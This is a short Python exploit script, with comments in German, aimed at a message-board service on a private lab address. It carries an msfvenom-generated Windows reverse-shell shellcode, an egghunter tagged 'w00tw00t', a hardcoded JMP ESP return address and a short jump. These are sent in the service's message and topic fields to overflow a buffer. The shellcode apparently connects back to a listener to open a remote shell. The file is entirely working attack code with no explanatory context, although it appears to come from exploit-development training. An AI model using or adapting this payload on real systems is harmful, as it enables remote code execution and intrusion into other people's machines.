#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# reverse shell erstellt mit msfvenom
shell =  b""
shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shell += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shell += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shell += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shell += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shell += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shell += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shell += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shell += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shell += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shell += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
shell += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
shell += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x00\x02\x0b\x68"
shell += b"\x02\x00\x15\xb3\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
shell += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
shell += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
shell += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
shell += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
shell += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
shell += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shell += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
shell += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shell += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
# egg which should be found by egghunter
egg = b'w00tw00t'
stage2 = egg + shell


# egghunter with tag w00t 32 byte
egghunter = b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
#jmp esp 77F1E684
eip = b'\x84\xE6\xF1\x77'
#short jump -44 byte
jmpBack = b'\xEB\xD4'
stage1 = b'\x90'*4 + egghunter + b'\x90'*4 + eip + jmpBack

connect=s.connect(('10.0.2.12', 4444)) # hardcoded IP address
s.recv(1024)
s.send(bytes('A \r\n', 'utf-8')) # Adding new message
s.recv(1024)
s.send(stage2 + bytes('\r\n', 'utf-8')) # Message Name
s.recv(1024)
s.send(stage2 + bytes('\r\n', 'utf-8')) # Message Body
s.recv(1024)

s.send(bytes('C \r\n', 'utf-8')) # Chaning board topic
s.recv(1024)
s.send(stage1 + bytes('\r\n', 'utf-8')) # Topic name
s.recv(1024)
s.send(bytes('y\r\n', 'utf-8')) # Conformation
s.close()